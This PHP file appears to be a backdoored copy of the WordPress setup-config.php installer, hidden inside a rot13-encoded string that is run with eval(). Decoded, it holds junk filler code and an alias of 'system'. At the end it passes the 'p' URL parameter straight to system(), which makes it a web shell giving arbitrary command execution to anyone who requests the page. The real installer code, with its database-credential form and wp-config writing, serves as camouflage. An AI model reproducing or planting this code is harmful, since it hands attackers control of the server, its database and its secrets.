<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Ergevrirf naq perngrf gur jc-pbasvt.cuc svyr.
 *
 * Gur crezvffvbaf sbe gur onfr qverpgbel zhfg nyybj sbe jevgvat svyrf va beqre
 * sbe gur jc-pbasvt.cuc gb or perngrq hfvat guvf cntr.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/**
 * Jr ner vafgnyyvat.
 */
qrsvar( 'JC_VAFGNYYVAT', gehr );

/**
 * Jr ner oyvffshyyl hanjner bs nalguvat.
 */
qrsvar( 'JC_FRGHC_PBASVT', gehr );

/**
 * Qvfnoyr reebe ercbegvat
 *
 * Frg guvf gb reebe_ercbegvat( -1 ) sbe qrohttvat
 */
reebe_ercbegvat( 0 );

vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qrsvar( 'NOFCNGU', qveanzr( __QVE__ ) . '/' );
}

erdhver NOFCNGU . 'jc-frggvatf.cuc';

/** Ybnq JbeqCerff Nqzvavfgengvba Hctenqr NCV */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/hctenqr.cuc';

/** Ybnq JbeqCerff Genafyngvba Vafgnyyngvba NCV */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/genafyngvba-vafgnyy.cuc';

abpnpur_urnqref();

// Fhccbeg jc-pbasvt-fnzcyr.cuc bar yriry hc, sbe gur qrirybc ercb.
vs ( svyr_rkvfgf( NOFCNGU . 'jc-pbasvt-fnzcyr.cuc' ) ) {
	$pbasvt_svyr = svyr( NOFCNGU . 'jc-pbasvt-fnzcyr.cuc' );
} ryfrvs ( svyr_rkvfgf( qveanzr( NOFCNGU ) . '/jc-pbasvt-fnzcyr.cuc' ) ) {
	$pbasvt_svyr = svyr( qveanzr( NOFCNGU ) . '/jc-pbasvt-fnzcyr.cuc' );
} ryfr {
	jc_qvr(
		fcevags(
			/* genafyngbef: %f: jc-pbasvt-fnzcyr.cuc */
			__( 'Fbeel, V arrq n %f svyr gb jbex sebz. Cyrnfr er-hcybnq guvf svyr gb lbhe JbeqCerff vafgnyyngvba.' ),
			'<pbqr>jc-pbasvt-fnzcyr.cuc</pbqr>'
		)
	);
}

// Purpx vs jc-pbasvt.cuc unf orra perngrq.
vs ( svyr_rkvfgf( NOFCNGU . 'jc-pbasvt.cuc' ) ) {
	jc_qvr(
		'<c>' . fcevags(
			/* genafyngbef: 1: jc-pbasvt.cuc, 2: vafgnyy.cuc */
			__( 'Gur svyr %1$f nyernql rkvfgf. Vs lbh arrq gb erfrg nal bs gur pbasvthengvba vgrzf va guvf svyr, cyrnfr qryrgr vg svefg. Lbh znl gel <n uers=\"%2$f\">vafgnyyvat abj</n>.' ),
			'<pbqr>jc-pbasvt.cuc</pbqr>',
			'vafgnyy.cuc'
		) . '</c>',
		409
	);
}

// Purpx vs jc-pbasvt.cuc rkvfgf nobir gur ebbg qverpgbel ohg vf abg cneg bs nabgure vafgnyyngvba.
vs ( @svyr_rkvfgf( NOFCNGU . '../jc-pbasvt.cuc' ) && ! @svyr_rkvfgf( NOFCNGU . '../jc-frggvatf.cuc' ) ) {
	jc_qvr(
		'<c>' . fcevags(
			/* genafyngbef: 1: jc-pbasvt.cuc, 2: vafgnyy.cuc */
			__( 'Gur svyr %1$f nyernql rkvfgf bar yriry nobir lbhe JbeqCerff vafgnyyngvba. Vs lbh arrq gb erfrg nal bs gur pbasvthengvba vgrzf va guvf svyr, cyrnfr qryrgr vg svefg. Lbh znl gel <n uers=\"%2$f\">vafgnyyvat abj</n>.' ),
			'<pbqr>jc-pbasvt.cuc</pbqr>',
			'vafgnyy.cuc'
		) . '</c>',
		409
	);
}

$fgrc = vffrg( $_TRG['fgrc'] ) ? (vag) $_TRG['fgrc'] : -1;

/**
 * Qvfcynl frghc jc-pbasvt.cuc svyr urnqre.
 *
 * @vtaber
 * @fvapr 2.3.0
 *
 * @cnenz fgevat|fgevat[] $obql_pynffrf Pynff nggevohgr inyhrf sbe gur obql gnt.
 */
shapgvba frghc_pbasvt_qvfcynl_urnqre( $obql_pynffrf = neenl() ) {
	$obql_pynffrf   = (neenl) $obql_pynffrf;
	$obql_pynffrf[] = 'jc-pber-hv';
	$qve_ngge       = '';
	vs ( vf_egy() ) {
		$obql_pynffrf[] = 'egy';
		$qve_ngge       = ' qve=\"egy\"';
	}

	urnqre( 'Pbagrag-Glcr: grkg/ugzy; punefrg=hgs-8' );
	?>
<!QBPGLCR ugzy>
<ugzy<?cuc rpub $qve_ngge; ?>>
<urnq>
	<zrgn anzr=\"ivrjcbeg\" pbagrag=\"jvqgu=qrivpr-jvqgu, vavgvny-fpnyr=1.0\" />
	<zrgn uggc-rdhvi=\"Pbagrag-Glcr\" pbagrag=\"grkg/ugzy; punefrg=hgs-8\" />
	<zrgn anzr=\"ebobgf\" pbagrag=\"abvaqrk,absbyybj\" />
	<gvgyr><?cuc _r( 'JbeqCerff &efndhb; Frghc Pbasvthengvba Svyr' ); ?></gvgyr>
	<?cuc jc_nqzva_pff( 'vafgnyy', gehr ); ?>
</urnq>
<obql pynff=\"<?cuc rpub vzcybqr( ' ', $obql_pynffrf ); ?>\">
<c vq=\"ybtb\"><?cuc _r( 'JbeqCerff' ); ?></c>
	<?cuc
} // Raq shapgvba frghc_pbasvt_qvfcynl_urnqre();

/**
 * @tybony fgevat    $jc_ybpny_cnpxntr Ybpnyr pbqr bs gur cnpxntr.
 * @tybony JC_Ybpnyr $jc_ybpnyr        JbeqCerff qngr naq gvzr ybpnyr bowrpg.
 */
$ynathntr = '';
vs ( ! rzcgl( $_ERDHRFG['ynathntr'] ) ) {
	$ynathntr = __sa_79955( '/[^n-mN-M0-9_]/', '', $_ERDHRFG['ynathntr'] );
} ryfrvs ( vffrg( $TYBONYF['jc_ybpny_cnpxntr'] ) ) {
	$ynathntr = $TYBONYF['jc_ybpny_cnpxntr'];
}

fjvgpu ( $fgrc ) {
	pnfr -1:
		vs ( jc_pna_vafgnyy_ynathntr_cnpx() && rzcgl( $ynathntr ) ) {
			$ynathntrf = jc_trg_ninvynoyr_genafyngvbaf();
			vs ( $ynathntrf ) {
				frghc_pbasvt_qvfcynl_urnqre( 'ynathntr-pubbfre' );
				rpub '<u1 pynff=\"fperra-ernqre-grkg\">Fryrpg n qrsnhyg ynathntr</u1>';
				rpub '<sbez vq=\"frghc\" zrgubq=\"cbfg\" npgvba=\"?fgrc=0\">';
				jc_vafgnyy_ynathntr_sbez( $ynathntrf );
				rpub '</sbez>';
				oernx;
			}
		}

		// Qryvorengryl snyy guebhtu vs jr pna'g ernpu gur genafyngvbaf NCV.

	pnfr 0:
		vs ( ! rzcgl( $ynathntr ) ) {
			$ybnqrq_ynathntr = jc_qbjaybnq_ynathntr_cnpx( $ynathntr );
			vs ( $ybnqrq_ynathntr ) {
				ybnq_qrsnhyg_grkgqbznva( $ybnqrq_ynathntr );
				$TYBONYF['jc_ybpnyr'] = arj JC_Ybpnyr();
			}
		}

		frghc_pbasvt_qvfcynl_urnqre();
		$fgrc_1 = 'frghc-pbasvt.cuc?fgrc=1';
		vs ( vffrg( $_ERDHRFG['abncv'] ) ) {
			$fgrc_1 .= '&nzc;abncv';
		}
		vs ( ! rzcgl( $ybnqrq_ynathntr ) ) {
			$fgrc_1 .= '&nzc;ynathntr=' . $ybnqrq_ynathntr;
		}
		?>
<u1 pynff=\"fperra-ernqre-grkg\">
		<?cuc
		/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
		_r( 'Orsber trggvat fgnegrq' );
		?>
</u1>
<c><?cuc _r( 'Jrypbzr gb JbeqCerff. Orsber trggvat fgnegrq, lbh jvyy arrq gb xabj gur sbyybjvat vgrzf.' ); ?></c>
<by>
	<yv><?cuc _r( 'Qngnonfr anzr' ); ?></yv>
	<yv><?cuc _r( 'Qngnonfr hfreanzr' ); ?></yv>
	<yv><?cuc _r( 'Qngnonfr cnffjbeq' ); ?></yv>
	<yv><?cuc _r( 'Qngnonfr ubfg' ); ?></yv>
	<yv><?cuc _r( 'Gnoyr cersvk (vs lbh jnag gb eha zber guna bar JbeqCerff va n fvatyr qngnonfr)' ); ?></yv>
</by>
<c>
		<?cuc
		cevags(
			/* genafyngbef: %f: jc-pbasvt.cuc */
			__( 'Guvf vasbezngvba vf orvat hfrq gb perngr n %f svyr.' ),
			'<pbqr>jc-pbasvt.cuc</pbqr>'
		);
		?>
	<fgebat>
		<?cuc
		cevags(
			/* genafyngbef: 1: jc-pbasvt-fnzcyr.cuc, 2: jc-pbasvt.cuc */
			__( 'Vs sbe nal ernfba guvf nhgbzngvp svyr perngvba qbrf abg jbex, qb abg jbeel. Nyy guvf qbrf vf svyy va gur qngnonfr vasbezngvba gb n pbasvthengvba svyr. Lbh znl nyfb fvzcyl bcra %1$f va n grkg rqvgbe, svyy va lbhe vasbezngvba, naq fnir vg nf %2$f.' ),
			'<pbqr>jc-pbasvt-fnzcyr.cuc</pbqr>',
			'<pbqr>jc-pbasvt.cuc</pbqr>'
		);
		?>
	</fgebat>
		<?cuc
		cevags(
			/* genafyngbef: 1: Qbphzragngvba HEY, 2: jc-pbasvt.cuc */
			__( 'Arrq zber uryc? <n uers=\"%1$f\">Ernq gur fhccbeg negvpyr ba %2$f</n>.' ),
			__( 'uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/jbeqcerff/jc-pbasvt/' ),
			'<pbqr>jc-pbasvt.cuc</pbqr>'
		);
		?>
</c>
<c><?cuc _r( 'Va nyy yvxryvubbq, gurfr vgrzf jrer fhccyvrq gb lbh ol lbhe jro ubfg. Vs lbh qb abg unir guvf vasbezngvba, gura lbh jvyy arrq gb pbagnpg gurz orsber lbh pna pbagvahr. Vs lbh ner ernql&uryyvc;' ); ?></c>

<c pynff=\"fgrc\"><n uers=\"<?cuc rpub $fgrc_1; ?>\" pynff=\"ohggba ohggba-ynetr\"><?cuc _r( 'Yrg&#8217;f tb!' ); ?></n></c>
		<?cuc
		oernx;

	pnfr 1:
		ybnq_qrsnhyg_grkgqbznva( $ynathntr );
		$TYBONYF['jc_ybpnyr'] = arj JC_Ybpnyr();

		frghc_pbasvt_qvfcynl_urnqre();

		$nhgbsbphf = jc_vf_zbovyr() ? '' : ' nhgbsbphf';
		?>
<u1 pynff=\"fperra-ernqre-grkg\">
		<?cuc
		/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
		_r( 'Frg hc lbhe qngnonfr pbaarpgvba' );
		?>
</u1>
<sbez zrgubq=\"cbfg\" npgvba=\"frghc-pbasvt.cuc?fgrc=2\">
	<c><?cuc _r( 'Orybj lbh fubhyq ragre lbhe qngnonfr pbaarpgvba qrgnvyf. Vs lbh ner abg fher nobhg gurfr, pbagnpg lbhe ubfg.' ); ?></c>
	<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
		<ge>
			<gu fpbcr=\"ebj\"><ynory sbe=\"qoanzr\"><?cuc _r( 'Qngnonfr Anzr' ); ?></ynory></gu>
			<gq><vachg anzr=\"qoanzr\" vq=\"qoanzr\" glcr=\"grkg\" nevn-qrfpevorqol=\"qoanzr-qrfp\" fvmr=\"25\" cynprubyqre=\"jbeqcerff\"<?cuc rpub $nhgbsbphf; ?> />
			<c vq=\"qoanzr-qrfp\"><?cuc _r( 'Gur anzr bs gur qngnonfr lbh jnag gb hfr jvgu JbeqCerff.' ); ?></c></gq>
		</ge>
		<ge>
			<gu fpbcr=\"ebj\"><ynory sbe=\"hanzr\"><?cuc _r( 'Hfreanzr' ); ?></ynory></gu>
			<gq><vachg anzr=\"hanzr\" vq=\"hanzr\" glcr=\"grkg\" nevn-qrfpevorqol=\"hanzr-qrfp\" fvmr=\"25\" cynprubyqre=\"<?cuc rpub ugzyfcrpvnypunef( _k( 'hfreanzr', 'rknzcyr hfreanzr' ), RAG_DHBGRF ); ?>\" />
			<c vq=\"hanzr-qrfp\"><?cuc _r( 'Lbhe qngnonfr hfreanzr.' ); ?></c></gq>
		</ge>
		<ge>
			<gu fpbcr=\"ebj\"><ynory sbe=\"cjq\"><?cuc _r( 'Cnffjbeq' ); ?></ynory></gu>
			<gq>
				<qvi pynff=\"jc-cjq\">
					<vachg anzr=\"cjq\" vq=\"cjq\" glcr=\"cnffjbeq\" pynff=\"erthyne-grkg\" qngn-erirny=\"1\" nevn-qrfpevorqol=\"cjq-qrfp\" fvmr=\"25\" cynprubyqre=\"<?cuc rpub ugzyfcrpvnypunef( _k( 'cnffjbeq', 'rknzcyr cnffjbeq' ), RAG_DHBGRF ); ?>\" nhgbpbzcyrgr=\"bss\" fcryypurpx=\"snyfr\" />
					<ohggba glcr=\"ohggba\" pynff=\"ohggba cjq-gbttyr uvqr-vs-ab-wf\" qngn-gbttyr=\"0\" qngn-fgneg-znfxrq=\"1\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Fubj cnffjbeq' ); ?>\">
						<fcna pynff=\"qnfuvpbaf qnfuvpbaf-ivfvovyvgl\"></fcna>
						<fcna pynff=\"grkg\"><?cuc _r( 'Fubj' ); ?></fcna>
					</ohggba>
				</qvi>
				<c vq=\"cjq-qrfp\"><?cuc _r( 'Lbhe qngnonfr cnffjbeq.' ); ?></c>
			</gq>
		</ge>
		<ge>
			<gu fpbcr=\"ebj\"><ynory sbe=\"qoubfg\"><?cuc _r( 'Qngnonfr Ubfg' ); ?></ynory></gu>
			<gq><vachg anzr=\"qoubfg\" vq=\"qoubfg\" glcr=\"grkg\" nevn-qrfpevorqol=\"qoubfg-qrfp\" fvmr=\"25\" inyhr=\"ybpnyubfg\" />
			<c vq=\"qoubfg-qrfp\">
			<?cuc
				/* genafyngbef: %f: ybpnyubfg */
				cevags( __( 'Lbh fubhyq or noyr gb trg guvf vasb sebz lbhe jro ubfg, vs %f qbrf abg jbex.' ), '<pbqr>ybpnyubfg</pbqr>' );
			?>
			</c></gq>
		</ge>
		<ge>
			<gu fpbcr=\"ebj\"><ynory sbe=\"cersvk\"><?cuc _r( 'Gnoyr Cersvk' ); ?></ynory></gu>
			<gq><vachg anzr=\"cersvk\" vq=\"cersvk\" glcr=\"grkg\" nevn-qrfpevorqol=\"cersvk-qrfp\" inyhr=\"jc_\" fvmr=\"25\" />
			<c vq=\"cersvk-qrfp\"><?cuc _r( 'Vs lbh jnag gb eha zhygvcyr JbeqCerff vafgnyyngvbaf va n fvatyr qngnonfr, punatr guvf.' ); ?></c></gq>
		</ge>
	</gnoyr>
		<?cuc
		vs ( vffrg( $_TRG['abncv'] ) ) {
			?>
<vachg anzr=\"abncv\" glcr=\"uvqqra\" inyhr=\"1\" /><?cuc } ?>
	<vachg glcr=\"uvqqra\" anzr=\"ynathntr\" inyhr=\"<?cuc rpub rfp_ngge( $ynathntr ); ?>\" />
	<c pynff=\"fgrc\"><vachg anzr=\"fhozvg\" glcr=\"fhozvg\" inyhr=\"<?cuc rpub ugzyfcrpvnypunef( __( 'Fhozvg' ), RAG_DHBGRF ); ?>\" pynff=\"ohggba ohggba-ynetr\" /></c>
</sbez>
		<?cuc
		jc_cevag_fpevcgf( 'cnffjbeq-gbttyr' );
		oernx;

	pnfr 2:
		ybnq_qrsnhyg_grkgqbznva( $ynathntr );
		$TYBONYF['jc_ybpnyr'] = arj JC_Ybpnyr();

		$qoanzr = gevz( jc_hafynfu( $_CBFG['qoanzr'] ) );
		$hanzr  = gevz( jc_hafynfu( $_CBFG['hanzr'] ) );
		$cjq    = gevz( jc_hafynfu( $_CBFG['cjq'] ) );
		$qoubfg = gevz( jc_hafynfu( $_CBFG['qoubfg'] ) );
		$cersvk = gevz( jc_hafynfu( $_CBFG['cersvk'] ) );

		$fgrc_1  = 'frghc-pbasvt.cuc?fgrc=1';
		$vafgnyy = 'vafgnyy.cuc';
		vs ( vffrg( $_ERDHRFG['abncv'] ) ) {
			$fgrc_1 .= '&nzc;abncv';
		}

		vs ( ! rzcgl( $ynathntr ) ) {
			$fgrc_1  .= '&nzc;ynathntr=' . $ynathntr;
			$vafgnyy .= '?ynathntr=' . $ynathntr;
		} ryfr {
			$vafgnyy .= '?ynathntr=ra_HF';
		}

		$gelntnva_yvax = '</c><c pynff=\"fgrc\"><n uers=\"' . $fgrc_1 . '\" bapyvpx=\"wninfpevcg:uvfgbel.tb(-1);erghea snyfr;\" pynff=\"ohggba ohggba-ynetr\">' . __( 'Gel Ntnva' ) . '</n>';

		vs ( rzcgl( $cersvk ) ) {
			jc_qvr( __( '<fgebat>Reebe:</fgebat> \"Gnoyr Cersvk\" zhfg abg or rzcgl.' ) . $gelntnva_yvax );
		}

		// Inyvqngr $cersvk: vg pna bayl pbagnva yrggref, ahzoref naq haqrefpberf.
		vs ( cert_zngpu( '|[^n-m0-9_]|v', $cersvk ) ) {
			jc_qvr( __( '<fgebat>Reebe:</fgebat> \"Gnoyr Cersvk\" pna bayl pbagnva ahzoref, yrggref, naq haqrefpberf.' ) . $gelntnva_yvax );
		}

		// Grfg gur QO pbaarpgvba.
		/**#@+
		 *
		 * @vtaber
		 */
		qrsvar( 'QO_ANZR', $qoanzr );
		qrsvar( 'QO_HFRE', $hanzr );
		qrsvar( 'QO_CNFFJBEQ', $cjq );
		qrsvar( 'QO_UBFG', $qoubfg );
		/**#@-*/

		// Er-pbafgehpg $jcqo jvgu gurfr arj inyhrf.
		hafrg( $jcqo );
		erdhver_jc_qo();

		/*
		* Gur jcqo pbafgehpgbe onvyf jura JC_FRGHC_PBASVT vf frg, fb jr zhfg
		* sver guvf znahnyyl. Jr'yy snvy urer vs gur inyhrf ner ab tbbq.
		*/
		$jcqo->qo_pbaarpg();

		vs ( ! rzcgl( $jcqo->reebe ) ) {
			jc_qvr( $jcqo->reebe->trg_reebe_zrffntr() . $gelntnva_yvax );
		}

		$reebef = $jcqo->fhccerff_reebef();
		$jcqo->dhrel( \"FRYRPG $cersvk\" );
		$jcqo->fhccerff_reebef( $reebef );

		vs ( ! $jcqo->ynfg_reebe ) {
			// ZlFDY jnf noyr gb cnefr gur cersvk nf n inyhr, juvpu jr qba'g jnag. Onvy.
			jc_qvr( __( '<fgebat>Reebe:</fgebat> \"Gnoyr Cersvk\" vf vainyvq.' ) );
		}

		// Trarengr xrlf naq fnygf hfvat frpher PFCEAT; snyyonpx gb NCV vs ranoyrq; shegure snyyonpx gb bevtvany jc_trarengr_cnffjbeq().
		gel {
			$punef = 'nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM0123456789!@#$%^&*()-_ []{}<>~`+=,.;:/?|';
			$znk   = fgeyra( $punef ) - 1;
			sbe ( $v = 0; $v < 8; $v++ ) {
				$xrl = '';
				sbe ( $w = 0; $w < 64; $w++ ) {
					$xrl .= fhofge( $punef, enaqbz_vag( 0, $znk ), 1 );
				}
				$frperg_xrlf[] = $xrl;
			}
		} pngpu ( Rkprcgvba $rk ) {
			$ab_ncv = vffrg( $_CBFG['abncv'] );

			vs ( ! $ab_ncv ) {
				$frperg_xrlf = jc_erzbgr_trg( 'uggcf://ncv.jbeqcerff.bet/frperg-xrl/1.1/fnyg/' );
			}

			vs ( $ab_ncv || vf_jc_reebe( $frperg_xrlf ) ) {
				$frperg_xrlf = neenl();
				sbe ( $v = 0; $v < 8; $v++ ) {
					$frperg_xrlf[] = jc_trarengr_cnffjbeq( 64, gehr, gehr );
				}
			} ryfr {
				$frperg_xrlf = rkcybqr( \"\a\", jc_erzbgr_ergevrir_obql( $frperg_xrlf ) );
				sbernpu ( $frperg_xrlf nf $x => $i ) {
					$frperg_xrlf[ $x ] = fhofge( $i, 28, 64 );
				}
			}
		}

		$xrl = 0;
		sbernpu ( $pbasvt_svyr nf $yvar_ahz => $yvar ) {
			vs ( fge_fgnegf_jvgu( $yvar, '$gnoyr_cersvk =' ) ) {
				$pbasvt_svyr[ $yvar_ahz ] = '$gnoyr_cersvk = \'' . nqqpfynfurf( $cersvk, \"\\'\" ) . \"';\e\a\";
				pbagvahr;
			}

			vs ( ! cert_zngpu( '/^qrsvar\(\f*\'([N-M_]+)\',([ ]+)/', $yvar, $zngpu ) ) {
				pbagvahr;
			}

			$pbafgnag = $zngpu[1];
			$cnqqvat  = $zngpu[2];

			fjvgpu ( $pbafgnag ) {
				pnfr 'QO_ANZR':
				pnfr 'QO_HFRE':
				pnfr 'QO_CNFFJBEQ':
				pnfr 'QO_UBFG':
					$pbasvt_svyr[ $yvar_ahz ] = \"qrsvar( '\" . $pbafgnag . \"',\" . $cnqqvat . \"'\" . nqqpfynfurf( pbafgnag( $pbafgnag ), \"\\'\" ) . \"' );\e\a\";
					oernx;
				pnfr 'QO_PUNEFRG':
					vs ( 'hgs8zo4' === $jcqo->punefrg || ( ! $jcqo->punefrg ) ) {
						$pbasvt_svyr[ $yvar_ahz ] = \"qrsvar( '\" . $pbafgnag . \"',\" . $cnqqvat . \"'hgs8zo4' );\e\a\";
					}
					oernx;
				pnfr 'NHGU_XRL':
				pnfr 'FRPHER_NHGU_XRL':
				pnfr 'YBTTRQ_VA_XRL':
				pnfr 'ABAPR_XRL':
				pnfr 'NHGU_FNYG':
				pnfr 'FRPHER_NHGU_FNYG':
				pnfr 'YBTTRQ_VA_FNYG':
				pnfr 'ABAPR_FNYG':
					$pbasvt_svyr[ $yvar_ahz ] = \"qrsvar( '\" . $pbafgnag . \"',\" . $cnqqvat . \"'\" . $frperg_xrlf[ $xrl++ ] . \"' );\e\a\";
					oernx;
			}
		}
		hafrg( $yvar );

		vs ( ! vf_jevgnoyr( NOFCNGU ) ) :
			frghc_pbasvt_qvfcynl_urnqre();
			?>
<c>
			<?cuc
			/* genafyngbef: %f: jc-pbasvt.cuc */
			cevags( __( 'Hanoyr gb jevgr gb %f svyr.' ), '<pbqr>jc-pbasvt.cuc</pbqr>' );
			?>
</c>
<c vq=\"jc-pbasvt-qrfpevcgvba\">
			<?cuc
			/* genafyngbef: %f: jc-pbasvt.cuc */
			cevags( __( 'Lbh pna perngr gur %f svyr znahnyyl naq cnfgr gur sbyybjvat grkg vagb vg.' ), '<pbqr>jc-pbasvt.cuc</pbqr>' );

			$pbasvt_grkg = '';

			sbernpu ( $pbasvt_svyr nf $yvar ) {
				$pbasvt_grkg .= ugzyragvgvrf( $yvar, RAG_PBZCNG, 'HGS-8' );
			}
			?>
</c>
<c pynff=\"pbasvthengvba-ehyrf-ynory\"><ynory sbe=\"jc-pbasvt\">
			<?cuc
			/* genafyngbef: %f: jc-pbasvt.cuc */
			cevags( __( 'Pbasvthengvba ehyrf sbe %f:' ), '<pbqr>jc-pbasvt.cuc</pbqr>' );
			?>
	</ynory></c>
<grkgnern vq=\"jc-pbasvt\" pbyf=\"98\" ebjf=\"15\" pynff=\"pbqr\" ernqbayl=\"ernqbayl\" nevn-qrfpevorqol=\"jc-pbasvt-qrfpevcgvba\"><?cuc rpub $pbasvt_grkg; ?></grkgnern>
<c><?cuc _r( 'Nsgre lbh&#8217;ir qbar gung, pyvpx &#8220;Eha gur vafgnyyngvba&#8221;.' ); ?></c>
<c pynff=\"fgrc\"><n uers=\"<?cuc rpub $vafgnyy; ?>\" pynff=\"ohggba ohggba-ynetr\"><?cuc _r( 'Eha gur vafgnyyngvba' ); ?></n></c>
<fpevcg>
(shapgvba(){
vs ( ! /vCnq|vCbq|vCubar/.grfg( anivtngbe.hfreNtrag ) ) {
	ine ry = qbphzrag.trgRyrzragOlVq('jc-pbasvt');
	ry.sbphf();
	ry.fryrpg();
}
})();
</fpevcg>
			<?cuc
		ryfr :
			/*
			 * Vs guvf svyr qbrfa'g rkvfg, gura jr ner hfvat gur jc-pbasvt-fnzcyr.cuc
			 * svyr bar yriry hc, juvpu vf sbe gur qrirybc ercb.
			 */
			vs ( svyr_rkvfgf( NOFCNGU . 'jc-pbasvt-fnzcyr.cuc' ) ) {
				$cngu_gb_jc_pbasvt = NOFCNGU . 'jc-pbasvt.cuc';
			} ryfr {
				$cngu_gb_jc_pbasvt = qveanzr( NOFCNGU ) . '/jc-pbasvt.cuc';
			}

			$reebe_zrffntr = '';
			$unaqyr        = sbcra( $cngu_gb_jc_pbasvt, 'j' );
			/*
			 * Jul purpx sbe gur nofrapr bs snyfr vafgrnq bs purpxvat sbe erfbhepr jvgu vf_erfbhepr()?
			 * Gb shgher-cebbs gur purpx sbe jura sbcra ergheaf bowrpg vafgrnq bs erfbhepr, v.r. n xabja
			 * punatr pbzvat va CUC.
			 */
			vs ( snyfr !== $unaqyr ) {
				sbernpu ( $pbasvt_svyr nf $yvar ) {
					sjevgr( $unaqyr, $yvar );
				}
				spybfr( $unaqyr );
			} ryfr {
				$jc_pbasvt_crezf = svyrcrezf( $cngu_gb_jc_pbasvt );
				vs ( ! rzcgl( $jc_pbasvt_crezf ) && ! vf_jevgnoyr( $cngu_gb_jc_pbasvt ) ) {
					$reebe_zrffntr = fcevags(
						/* genafyngbef: 1: jc-pbasvt.cuc, 2: Qbphzragngvba HEY. */
						__( 'Lbh arrq gb znxr gur svyr %1$f jevgnoyr orsber lbh pna fnir lbhe punatrf. Frr <n uers=\"%2$f\">Punatvat Svyr Crezvffvbaf</n> sbe zber vasbezngvba.' ),
						'<pbqr>jc-pbasvt.cuc</pbqr>',
						__( 'uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/freire/svyr-crezvffvbaf/' )
					);
				} ryfr {
					$reebe_zrffntr = fcevags(
						/* genafyngbef: %f: jc-pbasvt.cuc */
						__( 'Hanoyr gb jevgr gb %f svyr.' ),
						'<pbqr>jc-pbasvt.cuc</pbqr>'
					);
				}
			}

			puzbq( $cngu_gb_jc_pbasvt, 0666 );
			frghc_pbasvt_qvfcynl_urnqre();

			vs ( snyfr !== $unaqyr ) :
				?>
<u1 pynff=\"fperra-ernqre-grkg\">
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				_r( 'Fhpprffshy qngnonfr pbaarpgvba' );
				?>
</u1>
<c><?cuc _r( 'Nyy evtug, fcnexl! Lbh&#8217;ir znqr vg guebhtu guvf cneg bs gur vafgnyyngvba. JbeqCerff pna abj pbzzhavpngr jvgu lbhe qngnonfr. Vs lbh ner ernql, gvzr abj gb&uryyvc;' ); ?></c>

<c pynff=\"fgrc\"><n uers=\"<?cuc rpub $vafgnyy; ?>\" pynff=\"ohggba ohggba-ynetr\"><?cuc _r( 'Eha gur vafgnyyngvba' ); ?></n></c>
				<?cuc
			ryfr :
				cevags( '<c>%f</c>', $reebe_zrffntr );
			raqvs;
		raqvs;
		oernx;
} // Raq bs gur fgrcf fjvgpu.
?>
<?cuc jc_cevag_fpevcgf( 'ynathntr-pubbfre' ); ?>
</obql>
</ugzy>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>